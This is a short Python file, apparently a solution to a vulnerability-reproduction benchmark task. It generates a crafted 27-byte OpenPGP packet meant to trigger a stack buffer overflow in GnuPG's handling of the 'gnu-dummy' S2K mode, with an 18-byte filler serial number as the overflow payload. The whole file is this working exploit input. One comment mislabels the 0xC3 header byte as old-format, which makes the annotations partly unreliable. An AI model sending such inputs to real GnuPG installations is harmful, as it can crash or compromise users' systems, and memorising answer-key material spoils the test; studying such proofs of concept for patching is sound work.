import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a PoC for the Stack Buffer Overflow in GnuPG S2K parsing.
        # The vulnerability exists in the handling of the "gnu-dummy" S2K mode (101).
        # We construct a Symmetric-Key Encrypted Session Key Packet (Tag 3).
        # Target length is 27 bytes to match ground truth.
        
        # Structure:
        # Header (2 bytes):
        #   Tag: 0xC3 (Old Format, Tag 3, Length Type 0 - 1 byte length)
        #   Length: 0x19 (25 bytes body)
        # Body (25 bytes):
        #   Version: 0x04 (1 byte)
        #   Algo: 0x09 (AES256) (1 byte)
        #   S2K Specifier:
        #     Mode: 0x65 (101 - GnuPG extension) (1 byte)
        #     Magic: "GNU" (3 bytes)
        #     Protection: 0x01 (Divert to card) (1 byte)
        #     Serial Number: 18 bytes (Overflow payload)
        
        # 1 (Ver) + 1 (Algo) + 1 (Mode) + 3 (Magic) + 1 (Prot) = 7 bytes fixed body.
        # 25 (Total Body) - 7 = 18 bytes for serial number.
        # This overflows standard 8-byte salt buffers or 16-byte serial buffers.
        
        poc = b'\xc3\x19\x04\x09\x65GNU\x01' + b'A' * 18
        
        return poc